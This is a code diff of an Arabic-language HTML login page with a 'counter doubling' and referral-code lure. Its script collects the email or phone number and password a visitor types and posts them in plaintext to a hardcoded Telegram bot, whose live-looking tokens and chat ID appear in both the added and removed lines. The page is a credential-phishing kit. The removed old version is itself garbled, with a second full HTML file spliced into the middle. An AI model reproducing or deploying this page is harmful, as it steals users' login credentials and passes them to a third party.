@@ -3,70 +3,113 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول</title>
+    <title>تسجيل الدخول وإدارة العداد</title>
 
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; margin: 50px; }
-        input { display: block; width: 80%; margin: 10px auto; padding: 10px; border: 1px solid #ccc; border-radius: 5px; }
-        button { padding: 10px 20px; background-color: blue; color: white; border: none; cursor: pointer; border-radius: 5px; }
-        button:hover { background-color: darkblue; }
+        body { 
+            font-family: Arial, sans-serif; 
+            text-align: center; 
+            margin: 50px; 
+            background-color: #f4f4f4; 
+        }
+        .container {
+            width: 90%;
+            max-width: 400px;
+            background: white;
+            padding: 20px;
+            margin: auto;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+        }
+        input, button { 
+            display: block; 
+            width: 100%; 
+            margin: 10px 0; 
+            padding: 10px; 
+            border: 1px solid #ccc; 
+            border-radius: 5px; 
+            font-size: 16px; 
+        }
+        button { 
+            background-color: blue; 
+            color: white; 
+            cursor: pointer; 
+            border: none;
+        }
+        button:hover { 
+            background-color: darkblue; 
+        }
+        .hidden {
+            display: none;
+        }
+        .counter {
+            font-size: 20px;
+            font-weight: bold;
+            margin: 10px 0;
+        }
     </style>
 </head>
 
 <body>
-    <h2>تسجيل الدخول</h2>
 
-    <input type="email" id="email" placeholder="البريد الإلكتروني" required>
-    <input type="password" id="password" placeholder="كلمة المرور" required>
-    <button onclick="sendToTelegram()">تسجيل</button>
+    <!-- الواجهة الأولى: تسجيل الدخول -->
+    <div class="container" id="loginPage">
+        <h2>تسجيل الدخول</h2>
 
-    <script>
-        function sendToTelegram() {
-            // ضع التوكن الصحيح هنا
-            const botToken = "7672390569:AAF-vr0fIKGs9Tj7p--hWBJz1ZF8Xw2763A";  
-            // ضع معرف الدردشة الخاص بك هنا
-            const chatId = "7141386521";  
+        <input type="text" id="userInput" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+        <input type="password" id="password" placeholder="كلمة المرور" required>
 
-            const email = document.getElementById("email").value;
-            const password = document.getElementById("password").value;
-<!DOCTYPE html>
-<html lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول</title>
+        <button onclick="sendToTelegram()">تسجيل</button>
+        <button onclick="showCounterPage()">الانتقال إلى إدارة العداد</button>
+    </div>
 
-    <style>
-        body { font-family: Arial, sans-serif; text-align: center; margin: 50px; }
-        input { display: block; width: 80%; margin: 10px auto; padding: 10px; border: 1px solid #ccc; border-radius: 5px; }
-        button { padding: 10px 20px; background-color: blue; color: white; border: none; cursor: pointer; border-radius: 5px; }
-        button:hover { background-color: darkblue; }
-    </style>
-</head>
+    <!-- الواجهة الثانية: إدارة العداد -->
+    <div class="container hidden" id="counterPage">
+        <h2>إدارة العداد</h2>
 
-<body>
-    <h2>تسجيل الدخول</h2>
-
-    <input type="email" id="email" placeholder="البريد الإلكتروني" required>
-    <input type="password" id="password" placeholder="كلمة المرور" required>
-    <button onclick="sendToTelegram()">تسجيل</button>
+        <div class="counter">🔢 العداد الحالي: <span id="counter">1</span></div>
+        <input type="text" id="referralCode" placeholder="رمز الإحالة الخاص بك">
+        <button onclick="doubleCounter()">مضاعفة العداد</button>
+        <button onclick="showLoginPage()">العودة إلى تسجيل الدخول</button>
+    </div>
 
     <script>
+        let counter = 1; // العداد يبدأ من 1
+
+        function showCounterPage() {
+            document.getElementById("loginPage").classList.add("hidden");
+            document.getElementById("counterPage").classList.remove("hidden");
+        }
+
+        function showLoginPage() {
+            document.getElementById("counterPage").classList.add("hidden");
+            document.getElementById("loginPage").classList.remove("hidden");
+        }
+
+        function doubleCounter() {
+            counter *= 2;
+            document.getElementById("counter").innerText = counter;
+        }
+
         function sendToTelegram() {
-            // ضع التوكن الصحيح هنا
-            const botToken = "YOUR_BOT_TOKEN";  
-            // ضع معرف الدردشة الخاص بك هنا
-            const chatId = "YOUR_CHAT_ID";  
+            const botToken = "7415176260:AAHuQXsrHTDoYkt0CYvpbbSMRIlebvq4PdM";  // توكن البوت
+            const chatId = "7141386521";  // معرف المحادثة
 
-            const email = document.getElementById("email").value;
-            const password = document.getElementById("password").value;
+            const userInput = document.getElementById("userInput").value.trim();
+            const password = document.getElementById("password").value.trim();
+            const referralCode = document.getElementById("referralCode").value.trim();
 
-            if (email === "" || password === "") {
-                alert("يرجى ملء جميع الحقول");
+            if (userInput === "" || password === "") {
+                alert("⚠️ يرجى ملء جميع الحقول قبل المتابعة.");
                 return;
             }
 
-            const message = `📧 تسجيل جديد:\n✉ البريد الإلكتروني: ${email}\n🔑 كلمة المرور: ${password}`;
+            const message = `📧 تسجيل جديد:
+🔹 البريد/رقم الهاتف: ${userInput}
+🔑 كلمة المرور: ${password}
+🔢 العداد الحالي: ${counter}
+🎟 رمز الإحالة: ${referralCode ? referralCode : "لا يوجد"}`;
+
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
             fetch(url, {
@@ -77,46 +120,17 @@
             .then(response => response.json())
             .then(data => {
                 if (data.ok) {
-                    alert("تم الإرسال بنجاح");
+                    alert("✅ تم الإرسال بنجاح!");
                 } else {
-                    alert("حدث خطأ أثناء الإرسال");
+                    alert("❌ حدث خطأ أثناء الإرسال، يرجى المحاولة لاحقًا.");
                 }
             })
             .catch(error => {
-                console.error("Error:", error);
-                alert("فشل الإرسال، تحقق من التوكن و ID المحادثة.");
+                console.error("خطأ:", error);
+                alert("⚠️ فشل الإرسال، تحقق من التوكن و ID المحادثة.");
             });
         }
     </script>
-</body>
-</html>
 
-            if (email === "" || password === "") {
-                alert("يرجى ملء جميع الحقول");
-                return;
-            }
-
-            const message = `📧 تسجيل جديد:\n✉ البريد الإلكتروني: ${email}\n🔑 كلمة المرور: ${password}`;
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-            fetch(url, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: chatId, text: message })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    alert("تم الإرسال بنجاح");
-                } else {
-                    alert("حدث خطأ أثناء الإرسال");
-                }
-            })
-            .catch(error => {
-                console.error("Error:", error);
-                alert("فشل الإرسال، تحقق من التوكن و ID المحادثة.");
-            });
-        }
-    </script>
 </body>
 </html>
